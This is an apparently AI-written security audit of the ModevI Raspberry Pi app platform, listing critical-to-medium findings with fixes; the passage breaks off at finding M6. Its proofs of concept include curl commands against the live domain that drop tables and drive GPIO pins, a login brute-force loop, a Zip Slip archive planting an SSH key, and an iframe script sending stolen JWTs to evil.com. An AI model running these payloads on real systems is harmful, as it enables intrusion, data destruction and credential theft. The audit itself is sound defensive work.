# ModevI Security Audit Report

**Date:** 2026-03-15
**Auditor:** Claude Opus 4.6 (AI Security Auditor)
**Scope:** Full application -- FastAPI backend, React 19 frontend, split deployment (Railway + Raspberry Pi via Cloudflare Tunnel)
**Methodology:** Manual code review against OWASP Top 10 (2021), CWE catalog, and DevSecOps best practices

---

## Executive Summary

The ModevI platform contains **6 critical**, **8 high**, **7 medium**, and **5 low** severity findings across the backend, frontend, and deployment configuration. The most severe issues center on unauthenticated access to hardware/SDK endpoints exposed via a public Cloudflare Tunnel, unrestricted SQL execution on the SDK database endpoints, Zip Slip path traversal in app installation, and wildcard CORS configuration that negates browser-side security controls.

**Immediate action is required** on all Critical and High findings before public exposure. The platform is currently internet-accessible via `pi.modevi.es` with hardware control endpoints fully unauthenticated.

---

## Table of Contents

1. [Critical Findings (C1-C6)](#critical-findings)
2. [High Findings (H1-H8)](#high-findings)
3. [Medium Findings (M1-M7)](#medium-findings)
4. [Low Findings (L1-L5)](#low-findings)
5. [Dependency Analysis](#dependency-analysis)
6. [Remediation Priority Matrix](#remediation-priority-matrix)

---

## Critical Findings

### C1: Arbitrary SQL Execution via SDK Database Endpoints (SQL Injection)

**Severity:** Critical (CVSS 9.8)
**CWE:** CWE-89 (SQL Injection)
**Files:** `/home/fernando/Projects/rasModevi/backend/routers/sdk.py` lines 223-258
**OWASP:** A03:2021 -- Injection

**Description:**
The SDK database endpoints `/api/sdk/app/{id}/db/query` and `/api/sdk/app/{id}/db/exec` accept arbitrary SQL statements from the client with zero validation, filtering, or sandboxing. The `DBQueryIn` schema (line 250-252 of `schemas.py`) accepts any string as the `sql` field with no constraints.

**Proof of Concept:**
```bash
# Read the SQLite master table to enumerate all tables
curl -X POST https://pi.modevi.es/api/sdk/app/1/db/query \
  -H "Content-Type: application/json" \
  -d '{"sql": "SELECT * FROM sqlite_master", "params": []}'

# Execute destructive operations
curl -X POST https://pi.modevi.es/api/sdk/app/1/db/exec \
  -H "Content-Type: application/json" \
  -d '{"sql": "DROP TABLE IF EXISTS important_data", "params": []}'

# Attach another database file and read its contents
curl -X POST https://pi.modevi.es/api/sdk/app/1/db/query \
  -H "Content-Type: application/json" \
  -d '{"sql": "ATTACH DATABASE \"/home/fernando/Projects/rasModevi/backend/device.db\" AS main_db; SELECT * FROM main_db.installed_apps;", "params": []}'
```

**Impact:**
- Full read/write access to per-app SQLite databases
- `ATTACH DATABASE` can be used to read ANY SQLite file on the filesystem that the process user can access, including `device.db` (the main device database)
- Data destruction, data exfiltration, potential denial of service
- Combined with C2 (unauthenticated access), any internet user can exploit this

**Remediation:**
```python
# Option 1: Whitelist allowed SQL patterns
import re

ALLOWED_QUERY_PATTERNS = re.compile(
    r"^\s*(SELECT|INSERT|UPDATE|DELETE|CREATE\s+TABLE\s+IF\s+NOT\s+EXISTS)\b",
    re.IGNORECASE,
)

BLOCKED_KEYWORDS = {"ATTACH", "DETACH", "PRAGMA", "LOAD_EXTENSION", "DROP DATABASE"}

def _validate_sql(sql: str) -> None:
    sql_upper = sql.upper().strip()
    if not ALLOWED_QUERY_PATTERNS.match(sql):
        raise HTTPException(status_code=400, detail="SQL statement not allowed")
    for keyword in BLOCKED_KEYWORDS:
        if keyword in sql_upper:
            raise HTTPException(status_code=400, detail=f"'{keyword}' is not allowed")

# Option 2 (stronger): Disable dangerous SQLite features at connection level
def _open_app_db(installed_app_id: int) -> sqlite3.Connection:
    conn = sqlite3.connect(str(_app_db_path(installed_app_id)))
    conn.row_factory = sqlite3.Row
    # Disable loading extensions and attaching databases
    conn.execute("PRAGMA trusted_schema = OFF")
    conn.execute("PRAGMA cell_size_check = ON")
    # SQLite authorizer callback to block ATTACH, PRAGMA, etc.
    import sqlite3
    def authorizer(action, arg1, arg2, db_name, trigger):
        BLOCKED_ACTIONS = {
            sqlite3.SQLITE_ATTACH,
            sqlite3.SQLITE_DETACH,
            sqlite3.SQLITE_PRAGMA,
        }
        if action in BLOCKED_ACTIONS:
            return sqlite3.SQLITE_DENY
        return sqlite3.SQLITE_OK
    conn.set_authorizer(authorizer)
    return conn
```

---

### C2: Unauthenticated Hardware and SDK Endpoints Exposed to the Internet

**Severity:** Critical (CVSS 9.8)
**CWE:** CWE-306 (Missing Authentication for Critical Function)
**Files:**
- `/home/fernando/Projects/rasModevi/backend/routers/sdk.py` -- entire router (no auth dependency)
- `/home/fernando/Projects/rasModevi/backend/routers/hardware.py` -- entire router (no auth dependency)
- `/home/fernando/Projects/rasModevi/backend/routers/system.py` -- entire router (no auth dependency)
**OWASP:** A01:2021 -- Broken Access Control

**Description:**
The SDK, hardware, and system routers have **zero authentication requirements**. None of their endpoint functions include `Depends(get_current_user)` or any authentication dependency. These endpoints are served by `main.py` on the Raspberry Pi, which is publicly accessible via `pi.modevi.es` through a Cloudflare Tunnel.

**Affected endpoints (all unauthenticated):**
- `GET /api/sdk/system/info` -- Exposes hostname, CPU, RAM, disk, temperature
- `GET/PUT/DELETE /api/sdk/app/{id}/data/*` -- Read/write/delete any app's KV store
- `POST /api/sdk/app/{id}/db/query` -- Execute arbitrary SQL (see C1)
- `POST /api/sdk/app/{id}/db/exec` -- Execute arbitrary SQL (see C1)
- `GET/POST /api/sdk/hardware/gpio/{pin}` -- Read/write GPIO pins
- `GET/POST /api/sdk/hardware/gpio/{pin}/pwm` -- Control PWM (motors, LEDs)
- `GET /api/sdk/hardware/i2c/{bus}/{addr}/{reg}` -- Read I2C bus
- `GET /api/sdk/hardware/camera/snapshot` -- Capture camera images
- `GET /api/sdk/hardware/camera/stream` -- Live camera MJPEG stream
- `GET/POST/PUT/DELETE /api/hardware/sensors` -- Full CRUD on sensor config
- `GET /api/hardware/gpio/{pin}` -- Direct GPIO read
- `POST /api/hardware/gpio/{pin}` -- Direct GPIO write
- `GET /api/system/info` -- Full system information disclosure
- `GET /api/system/stats` -- Application statistics
- `WS /api/hardware/sensors/{id}/stream` -- WebSocket sensor data

**Proof of Concept:**
```bash
# Anyone on the internet can control hardware
curl https://pi.modevi.es/api/hardware/gpio/17 -X POST \
  -H "Content-Type: application/json" -d '{"value": 1}'

# Anyone can view the camera
curl https://pi.modevi.es/api/sdk/hardware/camera/snapshot

# Anyone can read system info
curl https://pi.modevi.es/api/system/info
```

**Impact:**
- Physical hardware damage through uncontrolled GPIO manipulation
- Privacy violation through unauthorized camera access
- Information disclosure of system details enabling further attacks
- Complete compromise of any installed app's data store
- Potential physical safety hazard if GPIO controls actuators

**Remediation:**
```python
# sdk.py -- add authentication to the router
from auth import get_current_user

# For SDK endpoints called from iframes, implement an API key per app
# or validate the Origin header matches the Pi's own domain

# For hardware.py and system.py -- add auth dependency
@router.get("/sensors", response_model=List[SensorOut])
async def list_sensors(
    current_user: User = Depends(get_current_user),  # ADD THIS
    db: Session = Depends(get_device_db),
):
    ...

# For SDK endpoints specifically (called from iframes without JWT):
# Option A: Validate that the request Origin matches the Pi's own domain
# Option B: Issue short-lived HMAC tokens embedded in the SDK JS
# Option C: Use a middleware that restricts SDK paths to same-origin requests only
```

---

### C3: Zip Slip Path Traversal in App Installation

**Severity:** Critical (CVSS 8.6)
**CWE:** CWE-22 (Path Traversal), CWE-73 (External Control of File Name or Path)
**Files:**
- `/home/fernando/Projects/rasModevi/backend/routers/device.py` lines 240-241
- `/home/fernando/Projects/rasModevi/backend/routers/ai.py` lines 1319-1320
**OWASP:** A01:2021 -- Broken Access Control

**Description:**
Both `device.py` and `ai.py` use `zipfile.ZipFile.extractall()` without validating that the archive members do not contain path traversal sequences (e.g., `../../etc/cron.d/malicious`). A malicious ZIP file uploaded to the store can overwrite arbitrary files on the Pi filesystem when installed.

**Vulnerable code in `device.py`:**
```python
with zipfile.ZipFile(zip_path) as zf:
    zf.extractall(install_path)  # No member validation
```

**Proof of Concept:**
A malicious ZIP can be crafted with entries like:
```
../../.bashrc
../../.ssh/authorized_keys
../../../etc/cron.d/backdoor
```

When extracted to `/home/fernando/Projects/rasModevi/backend/installed/42/`, these paths resolve outside the intended directory. Python's `zipfile.extractall()` before Python 3.12 does NOT prevent this.

```python
import zipfile, io

zip_buf = io.BytesIO()
with zipfile.ZipFile(zip_buf, 'w') as zf:
    zf.writestr("../../.ssh/authorized_keys", "ssh-rsa AAAA... attacker@evil.com")
    zf.writestr("index.html", "<html>Malicious app</html>")
    zf.writestr("manifest.json", '{"name":"Evil","version":"1.0","description":"Pwned"}')
# Upload this ZIP via /api/developer/apps/{id}/upload, then install it
```

**Impact:**
- Arbitrary file write on the Raspberry Pi filesystem as the running user
- Code execution via cron jobs, bashrc modification, or SSH key injection
- Complete system compromise

**Remediation:**
```python
import os

def safe_extract(zf: zipfile.ZipFile, target_dir: Path) -> None:
    """Extract ZIP contents safely, preventing Zip Slip path traversal."""
    target_dir = target_dir.resolve()
    for member in zf.infolist():
        member_path = (target_dir / member.filename).resolve()
        # Ensure the resolved path is within the target directory
        if not str(member_path).startswith(str(target_dir) + os.sep) and member_path != target_dir:
            raise HTTPException(
                status_code=400,
                detail=f"Illegal path in ZIP: {member.filename}"
            )
    zf.extractall(target_dir)

# Replace all calls to zf.extractall(install_path) with:
safe_extract(zf, install_path)
```

---

### C4: Admin Role Self-Assignment at Registration

**Severity:** Critical (CVSS 9.1)
**CWE:** CWE-269 (Improper Privilege Management)
**Files:**
- `/home/fernando/Projects/rasModevi/backend/schemas.py` lines 15-26
- `/home/fernando/Projects/rasModevi/backend/routers/auth.py` lines 42-47
**OWASP:** A01:2021 -- Broken Access Control

**Description:**
The `UserCreate` schema accepts `role` as a user-controllable field with `"admin"` as a valid value. The registration endpoint directly assigns this role to the new user without any server-side override. While registration is currently disabled, re-enabling it (as documented in the project) immediately exposes this privilege escalation.

**Vulnerable code in `schemas.py`:**
```python
class UserCreate(BaseModel):
    username: str = Field(..., min_length=3, max_length=50)
    email: str
    password: str = Field(..., min_length=6)
    role: str = "user"

    @field_validator("role")
    @classmethod
    def validate_role(cls, v: str) -> str:
        if v not in ("user", "developer", "admin"):  # "admin" is explicitly allowed!
            raise ValueError("role must be 'user', 'developer', or 'admin'")
        return v
```

**Vulnerable code in `auth.py` (router):**
```python
user = User(
    username=body.username,
    email=body.email,
    hashed_password=get_password_hash(body.password),
    role=body.role,  # Directly from user input -- no override
)
```

**Proof of Concept:**
```bash
# If registration is re-enabled:
curl -X POST https://modevi.es/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","email":"h@evil.com","password":"pwned123","role":"admin"}'
# Response: 201 Created with role="admin"
```

**Impact:**
- Any user can create an admin account
- Admin role grants access to approve/reject apps (admin.py) and potentially all developer endpoints
- Complete authorization bypass

**Remediation:**
```python
# schemas.py -- remove admin from allowed registration roles
class UserCreate(BaseModel):
    username: str = Field(..., min_length=3, max_length=50)
    email: str
    password: str = Field(..., min_length=6)
    role: str = "user"

    @field_validator("role")
    @classmethod
    def validate_role(cls, v: str) -> str:
        if v not in ("user", "developer"):  # NEVER allow admin self-assignment
            raise ValueError("role must be 'user' or 'developer'")
        return v

# OR, even safer -- force role server-side:
# In routers/auth.py:
user = User(
    username=body.username,
    email=body.email,
    hashed_password=get_password_hash(body.password),
    role="user",  # Always force to 'user'; admins promote via admin panel
)
```

---

### C5: Wildcard CORS Allows Cross-Origin Attacks

**Severity:** Critical (CVSS 8.1)
**CWE:** CWE-942 (Permissive Cross-domain Policy)
**Files:**
- `/home/fernando/Projects/rasModevi/backend/main.py` lines 137-142
- `/home/fernando/Projects/rasModevi/backend/main_store.py` lines 80-85
**OWASP:** A05:2021 -- Security Misconfiguration

**Description:**
Both the Pi backend (`main.py`) and the Railway store (`main_store.py`) configure CORS with `allow_origins=["*"]`, `allow_methods=["*"]`, and `allow_headers=["*"]`. This allows any website on the internet to make authenticated cross-origin requests to both backends.

```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],     # Any origin
    allow_methods=["*"],     # Any HTTP method
    allow_headers=["*"],     # Including Authorization header
)
```

**Impact:**
- Any malicious website can make authenticated API calls on behalf of a logged-in user
- Combined with C2 (unauthenticated endpoints), any website can directly control hardware
- CSRF-like attacks bypassing all browser same-origin protections
- Token theft if combined with XSS on any domain

Note: When `allow_origins=["*"]` with `allow_credentials=True`, FastAPI's CORS middleware actually blocks credentialed requests. However, the configuration as-is (`allow_credentials` defaults to `False`) means the `Authorization` header from JavaScript `fetch` calls IS allowed from any origin, which is the attack vector.

**Remediation:**
```python
ALLOWED_ORIGINS = [
    "https://modevi.es",
    "https://pi.modevi.es",
    "http://localhost:5173",  # Vite dev server
    "http://localhost:8000",
    "http://192.168.88.242:8000",  # Pi local
]

app.add_middleware(
    CORSMiddleware,
    allow_origins=ALLOWED_ORIGINS,
    allow_methods=["GET", "POST", "PUT", "DELETE", "OPTIONS"],
    allow_headers=["Authorization", "Content-Type"],
    allow_credentials=True,
)
```

---

### C6: `require_developer` Does Not Enforce Developer Role

**Severity:** Critical (CVSS 8.1)
**CWE:** CWE-863 (Incorrect Authorization)
**File:** `/home/fernando/Projects/rasModevi/backend/auth.py` lines 113-115
**OWASP:** A01:2021 -- Broken Access Control

**Description:**
The `require_developer` dependency function is supposed to enforce that only users with the "developer" (or "admin") role can access developer-only endpoints. However, the function simply returns the current user without any role check:

```python
def require_developer(current_user: User = Depends(get_current_user)) -> User:
    # Any authenticated user can create and publish apps
    return current_user
```

This means **any authenticated user** (including those with role "user") can access all developer endpoints:
- `POST /api/developer/apps` -- Create store app listings
- `POST /api/developer/apps/{id}/upload` -- Upload app packages
- `PUT /api/developer/apps/{id}` -- Update apps
- `DELETE /api/developer/apps/{id}` -- Delete apps

**Impact:**
- Any regular user can publish apps to the store
- Any regular user can consume AI tokens via app generation (the AI endpoints also use `require_developer`/`get_current_user`)
- Bypasses the intended role-based access control

**Remediation:**
```python
def require_developer(current_user: User = Depends(get_current_user)) -> User:
    if current_user.role not in ("developer", "admin"):
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Developer or admin role required",
        )
    return current_user
```

---

## High Findings

### H1: JWT Token Exposure in URL Query Parameters

**Severity:** High (CVSS 7.5)
**CWE:** CWE-598 (Use of GET Request Method with Sensitive Query Strings)
**File:** `/home/fernando/Projects/rasModevi/backend/routers/ai.py` lines 1363-1401
**OWASP:** A02:2021 -- Cryptographic Failures

**Description:**
The SSE endpoints `/api/ai/create-app` and `/api/ai/debug-app` accept the JWT access token as a URL query parameter (`?token=JWT`). This causes the token to be logged in:
- Server access logs
- Cloudflare Tunnel logs and analytics
- Railway deployment logs
- Browser history
- Any intermediate proxy logs
- Referrer headers if the page navigates

```python
@router.get("/create-app")
async def create_app_with_ai(
    ...
    token: str = Query(..., description="JWT access token"),  # JWT in URL!
    ...
):
```

**Impact:**
- JWT tokens persisted in multiple log sources
- Tokens remain valid for 30 minutes and can be replayed
- Refresh tokens (7-day validity) may also be exposed if misused
- Cloudflare (a third party) can see and log these tokens

**Remediation:**
Use a short-lived, single-use SSE ticket pattern:
```python
# 1. Create a ticket endpoint that exchanges JWT for a short-lived nonce
import secrets, time

_sse_tickets: dict[str, tuple[int, float]] = {}  # ticket -> (user_id, expires_at)

@router.post("/sse-ticket")
async def create_sse_ticket(user: User = Depends(get_current_user)):
    ticket = secrets.token_urlsafe(32)
    _sse_tickets[ticket] = (user.id, time.time() + 30)  # 30 second validity
    return {"ticket": ticket}

# 2. SSE endpoint validates ticket instead of JWT
@router.get("/create-app")
async def create_app_with_ai(
    ticket: str = Query(...),
    ...
):
    entry = _sse_tickets.pop(ticket, None)
    if not entry or time.time() > entry[1]:
        raise HTTPException(401, "Invalid or expired ticket")
    user_id = entry[0]
    ...
```

---

### H2: Hardcoded Default Credentials in Seed Data

**Severity:** High (CVSS 7.2)
**CWE:** CWE-798 (Use of Hard-coded Credentials)
**File:** `/home/fernando/Projects/rasModevi/backend/seed.py` lines 128-144
**OWASP:** A07:2021 -- Identification and Authentication Failures

**Description:**
The seed script creates two accounts with hardcoded, well-known passwords:
- `admin` / `admin123` (admin role)
- `devuser` / `dev123` (developer role)

These credentials are documented in `CLAUDE.md` and `README.md`. The seed runs on every application startup. If an attacker gains knowledge of these credentials (which are in the public git repository), they can log in to both the Railway deployment and the Pi.

**Impact:**
- Immediate admin access to the platform
- Full developer access for uploading malicious apps
- AI token consumption via the admin/developer accounts
- Access to all user-scoped data (installed apps, notes, etc.)

**Remediation:**
```python
import os

def seed():
    ...
    admin_password = os.getenv("ADMIN_DEFAULT_PASSWORD", None)
    if not admin_password:
        import secrets
        admin_password = secrets.token_urlsafe(16)
        print(f"Generated admin password: {admin_password}")  # Log once on first run

    admin = platform_db.query(User).filter(User.username == "admin").first()
    if not admin:
        admin = User(
            username="admin",
            ...
            hashed_password=_hash(admin_password),
            ...
        )
```
Additionally, force a password change on first login, or remove the seed accounts from production deployments entirely.

---

### H3: No Rate Limiting on Authentication Endpoints

**Severity:** High (CVSS 7.5)
**CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)
**File:** `/home/fernando/Projects/rasModevi/backend/routers/auth.py` lines 54-69
**OWASP:** A07:2021 -- Identification and Authentication Failures

**Description:**
The login endpoint `/api/auth/login` has no rate limiting, account lockout, or brute-force protection. An attacker can make unlimited authentication attempts. The token refresh endpoint similarly lacks rate limiting.

No rate limiting middleware is configured anywhere in `main.py` or `main_store.py`.

**Proof of Concept:**
```bash
# Unlimited login attempts
for i in $(seq 1 10000); do
  curl -s -X POST https://modevi.es/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"attempt'$i'"}'
done
```

**Impact:**
- Brute-force attacks against known usernames (admin, devuser)
- With the weak default passwords, a dictionary attack succeeds quickly
- No mechanism to detect or alert on brute-force attempts
- Denial of service against the bcrypt hashing (CPU-intensive)

**Remediation:**
```python
# Install: pip install slowapi
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded

limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

@router.post("/login", response_model=Token)
@limiter.limit("5/minute")
async def login(request: Request, body: LoginRequest, ...):
    ...
```

---

### H4: Missing Security Headers

**Severity:** High (CVSS 6.5)
**CWE:** CWE-693 (Protection Mechanism Failure)
**Files:**
- `/home/fernando/Projects/rasModevi/backend/main.py`
- `/home/fernando/Projects/rasModevi/backend/main_store.py`
**OWASP:** A05:2021 -- Security Misconfiguration

**Description:**
Neither backend sets any security-related HTTP headers. The following headers are completely absent:
- `Strict-Transport-Security` (HSTS)
- `Content-Security-Policy` (CSP)
- `X-Content-Type-Options`
- `X-Frame-Options`
- `Referrer-Policy`
- `Permissions-Policy`

**Impact:**
- Without HSTS: Downgrade attacks from HTTPS to HTTP
- Without CSP: No defense-in-depth against XSS
- Without X-Content-Type-Options: MIME-type confusion attacks
- Without X-Frame-Options: Clickjacking on the main application

**Remediation:**
```python
from starlette.middleware import Middleware
from starlette.middleware.base import BaseHTTPMiddleware

class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request, call_next):
        response = await call_next(request)
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["X-Frame-Options"] = "SAMEORIGIN"
        response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
        response.headers["Permissions-Policy"] = "camera=(), microphone=(), geolocation=()"
        response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
        response.headers["Content-Security-Policy"] = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'"
        return response

app.add_middleware(SecurityHeadersMiddleware)
```

---

### H5: Iframe Sandbox `allow-same-origin` Negates Sandboxing

**Severity:** High (CVSS 7.5)
**CWE:** CWE-1021 (Improper Restriction of Rendered UI Layers)
**File:** `/home/fernando/Projects/rasModevi/frontend/src/pages/AppRunnerPage.jsx` line 61
**OWASP:** A01:2021 -- Broken Access Control

**Description:**
The app runner iframe uses:
```html
sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-pointer-lock allow-downloads"
```

The combination of `allow-scripts` and `allow-same-origin` is explicitly warned against in the HTML specification because it allows the sandboxed content to remove the sandbox attribute entirely and escape the iframe. Since the apps are served from the same origin (`pi.modevi.es/installed/{id}/`), a malicious app can:

1. Access the parent frame's DOM
2. Read `localStorage` containing JWT tokens
3. Make API calls with the user's credentials
4. Access other installed apps' data
5. Modify the parent page

**Proof of Concept (malicious app):**
```html
<script>
  // Steal JWT tokens from parent's localStorage
  const token = window.top.localStorage.getItem('access_token');
  // Or from same-origin localStorage
  const tokenDirect = localStorage.getItem('access_token');

  // Exfiltrate
  fetch('https://evil.com/steal?token=' + token);

  // Or remove the sandbox and inject into the parent
  window.top.document.body.innerHTML = '<h1>Hijacked</h1>';
</script>
```

**Impact:**
- Any installed app (including community-uploaded apps) can steal user credentials
- Full account takeover through JWT theft
- Cross-app data access (reading other apps' storage)
- UI redressing/phishing from within the iframe

**Remediation:**
Serve app content from a separate subdomain (e.g., `apps.pi.modevi.es`) that is a different origin from the main application. This way `allow-same-origin` still lets the iframe access its own storage but cannot cross the origin boundary to the parent frame.

Alternatively, if separate subdomains are not feasible, remove `allow-same-origin` and modify the SDK to use `postMessage` for all parent-child communication:
```html
sandbox="allow-scripts allow-forms allow-popups allow-pointer-lock allow-downloads"
```
Note: Removing `allow-same-origin` means `localStorage` and `fetch` to same-origin APIs will not work inside the iframe. The SDK must be refactored to communicate via `postMessage` with a trusted parent.

---

### H6: No Validation of GPIO Pin Numbers

**Severity:** High (CVSS 7.1)
**CWE:** CWE-20 (Improper Input Validation)
**Files:**
- `/home/fernando/Projects/rasModevi/backend/hw.py` lines 28-43
- `/home/fernando/Projects/rasModevi/backend/routers/hardware.py` lines 80-95
- `/home/fernando/Projects/rasModevi/backend/routers/sdk.py` lines 272-303
**OWASP:** A03:2021 -- Injection

**Description:**
GPIO pin numbers are accepted as arbitrary integers from the URL path (`{pin}`) with no validation against valid BCM pin ranges for the Raspberry Pi 5 (valid range: 0-27). An attacker can request operations on invalid pins, potentially causing hardware errors or accessing pins that control critical peripherals.

Similarly, I2C bus numbers, addresses, and register values are not validated.

**Proof of Concept:**
```bash
# Write to an invalid/dangerous pin
curl -X POST https://pi.modevi.es/api/hardware/gpio/999 \
  -H "Content-Type: application/json" -d '{"value": 1}'

# Read I2C with unrestricted parameters
curl https://pi.modevi.es/api/sdk/hardware/i2c/0/0/0?length=65535
```

**Impact:**
- Potential hardware errors or undefined behavior
- Access to pins used by the system (UART, SPI for boot media)
- I2C reads with large `length` values could cause memory issues
- Combined with C2 (no auth), any internet user can trigger this

**Remediation:**
```python
VALID_GPIO_PINS = set(range(0, 28))  # BCM pins for Pi 5

def _validate_pin(pin: int) -> None:
    if pin not in VALID_GPIO_PINS:
        raise HTTPException(status_code=400, detail=f"Invalid GPIO pin: {pin}. Valid range: 0-27")

@router.get("/gpio/{pin}")
async def gpio_read(pin: int):
    _validate_pin(pin)
    ...

# For I2C, validate:
# - bus: 0 or 1
# - address: 0x03-0x77 (7-bit I2C address range)
# - length: 1-32 (reasonable read size)
```

---

### H7: Path Traversal in `serve_frontend` Catch-All

**Severity:** High (CVSS 6.5)
**CWE:** CWE-22 (Path Traversal)
**Files:**
- `/home/fernando/Projects/rasModevi/backend/main.py` lines 196-201
- `/home/fernando/Projects/rasModevi/backend/main_store.py` lines 111-116
**OWASP:** A01:2021 -- Broken Access Control

**Description:**
The SPA catch-all route serves files from the frontend directory based on the URL path without verifying the resolved path stays within `FRONTEND_DIR`:

```python
@app.get("/{full_path:path}", include_in_schema=False)
async def serve_frontend(full_path: str):
    file_path = FRONTEND_DIR / full_path
    if file_path.is_file():
        return FileResponse(str(file_path))
    return FileResponse(str(FRONTEND_DIR / "index.html"))
```

While FastAPI and Starlette's path handling provides some protection against `../` sequences in URL paths, certain edge cases with encoded path separators or OS-specific path handling could allow accessing files outside `FRONTEND_DIR`.

**Remediation:**
```python
@app.get("/{full_path:path}", include_in_schema=False)
async def serve_frontend(full_path: str):
    file_path = (FRONTEND_DIR / full_path).resolve()
    if not str(file_path).startswith(str(FRONTEND_DIR.resolve())):
        return FileResponse(str(FRONTEND_DIR / "index.html"))
    if file_path.is_file():
        return FileResponse(str(file_path))
    return FileResponse(str(FRONTEND_DIR / "index.html"))
```

---

### H8: JWT Tokens Stored in localStorage (XSS Token Theft)

**Severity:** High (CVSS 6.5)
**CWE:** CWE-922 (Insecure Storage of Sensitive Information)
**Files:**
- `/home/fernando/Projects/rasModevi/frontend/src/context/AuthContext.jsx` lines 33-34
- `/home/fernando/Projects/rasModevi/frontend/src/api/client.js` lines 34, 48-50
**OWASP:** A02:2021 -- Cryptographic Failures

**Description:**
JWT access and refresh tokens are stored in `localStorage`, which is accessible to any JavaScript running on the same origin. Combined with H5 (iframe sandbox escape), any installed app can steal these tokens.

```javascript
localStorage.setItem('access_token', data.access_token)
localStorage.setItem('refresh_token', data.refresh_token)
```

**Impact:**
- Any XSS vulnerability or malicious installed app can steal both access and refresh tokens
- Refresh tokens valid for 7 days enable persistent access
- No mechanism to revoke tokens once stolen

**Remediation:**
Use HTTP-only, Secure, SameSite cookies for token storage:
```python
# Backend: Set tokens as HTTP-only cookies
from fastapi.responses import JSONResponse

@router.post("/login")
async def login(body: LoginRequest, ...):
    ...
    response = JSONResponse(content={"message": "Login successful"})
    response.set_cookie(
        key="access_token",
        value=access_token,
        httponly=True,
        secure=True,
        samesite="strict",
        max_age=ACCESS_TOKEN_EXPIRE_MINUTES * 60,
    )
    response.set_cookie(
        key="refresh_token",
        value=refresh_token,
        httponly=True,
        secure=True,
        samesite="strict",
        max_age=REFRESH_TOKEN_EXPIRE_DAYS * 86400,
        path="/api/auth/refresh",  # Only sent to refresh endpoint
    )
    return response
```

---

## Medium Findings

### M1: No Token Revocation or Blacklisting

**Severity:** Medium (CVSS 5.5)
**CWE:** CWE-613 (Insufficient Session Expiration)
**File:** `/home/fernando/Projects/rasModevi/backend/auth.py`
**OWASP:** A07:2021 -- Identification and Authentication Failures

**Description:**
There is no mechanism to revoke JWT tokens. If a token is compromised, it remains valid until expiration (30 minutes for access, 7 days for refresh). The logout function on the frontend only removes tokens from localStorage; the tokens remain valid server-side.

**Remediation:**
Implement a server-side token blacklist (Redis or in-memory with TTL matching token expiry) checked during `verify_token()`. At minimum, implement refresh token rotation with family detection to invalidate all tokens in a family when reuse is detected.

---

### M2: WebSocket Endpoint Without Authentication

**Severity:** Medium (CVSS 5.3)
**CWE:** CWE-306 (Missing Authentication)
**File:** `/home/fernando/Projects/rasModevi/backend/routers/hardware.py` lines 182-195
**OWASP:** A01:2021 -- Broken Access Control

**Description:**
The WebSocket endpoint `/api/hardware/sensors/{sensor_id}/stream` accepts connections without any authentication. Any client can connect and receive real-time sensor data.

```python
@router.websocket("/sensors/{sensor_id}/stream")
async def sensor_stream(sensor_id: int, websocket: WebSocket):
    await websocket.accept()  # No authentication check
```

**Remediation:**
```python
@router.websocket("/sensors/{sensor_id}/stream")
async def sensor_stream(sensor_id: int, websocket: WebSocket):
    # Validate JWT from query param or first message
    token = websocket.query_params.get("token")
    if not token:
        await websocket.close(code=4001, reason="Authentication required")
        return
    try:
        payload = verify_token(token)
    except HTTPException:
        await websocket.close(code=4001, reason="Invalid token")
        return
    await websocket.accept()
    ...
```

---

### M3: Information Disclosure via System Endpoints

**Severity:** Medium (CVSS 5.3)
**CWE:** CWE-200 (Exposure of Sensitive Information)
**Files:**
- `/home/fernando/Projects/rasModevi/backend/routers/system.py` lines 17-47
- `/home/fernando/Projects/rasModevi/backend/routers/sdk.py` lines 101-128
**OWASP:** A01:2021 -- Broken Access Control

**Description:**
The system info endpoints expose detailed hardware and OS information without authentication:
- Hostname (`modevi-pi`)
- OS version and kernel release
- Python version
- CPU architecture, count, frequency
- Exact RAM and disk sizes
- CPU temperature
- System uptime

This information aids reconnaissance for targeted attacks.

**Remediation:**
Add authentication to these endpoints and consider reducing the information returned to what apps actually need.

---

### M4: Error Messages Leak Internal Details

**Severity:** Medium (CVSS 4.3)
**CWE:** CWE-209 (Information Exposure Through Error Messages)
**Files:** Multiple routers (sdk.py, hardware.py, developer.py, ai.py)
**OWASP:** A05:2021 -- Security Misconfiguration

**Description:**
Exception handlers throughout the codebase return raw exception messages to the client:

```python
# sdk.py line 237
except sqlite3.Error as exc:
    raise HTTPException(status_code=400, detail={"detail": str(exc), ...})

# hardware.py line 86
except Exception as exc:
    raise HTTPException(status_code=500, detail={"detail": str(exc), ...})

# developer.py line 160
detail={"detail": f"Failed to upload package to storage: {exc}", ...}
```

These can leak internal paths, database schema details, library versions, and infrastructure information.

**Remediation:**
Log detailed errors server-side and return generic messages to clients:
```python
import logging
log = logging.getLogger(__name__)

except Exception as exc:
    log.exception("GPIO error on pin %d", pin)
    raise HTTPException(status_code=500, detail={"detail": "Hardware operation failed", "code": "GPIO_ERROR"})
```

---

### M5: No Input Length Limits on AI Prompt and Feedback

**Severity:** Medium (CVSS 4.3)
**CWE:** CWE-400 (Uncontrolled Resource Consumption)
**File:** `/home/fernando/Projects/rasModevi/backend/routers/ai.py` lines 1363-1371
**OWASP:** A04:2021 -- Insecure Design

**Description:**
The `description` parameter for AI app creation has `min_length=10` but no `max_length`. Similarly, the `feedback` parameter for debug-app has no length constraint. An attacker can send megabytes of text, which:
1. Gets sent to the Anthropic API (token cost)
2. Consumes server memory during request parsing
3. Inflates the system prompt context window

The `name` parameter also has `min_length=2` but no `max_length`.

**Remediation:**
```python
@router.get("/create-app")
async def create_app_with_ai(
    description: str = Query(..., min_length=10, max_length=5000),
    name: str = Query(..., min_length=2, max_length=200),
    ...
):
```

---

### M6: `StoreAppUpdate` Allows Blind Mass-Assignment
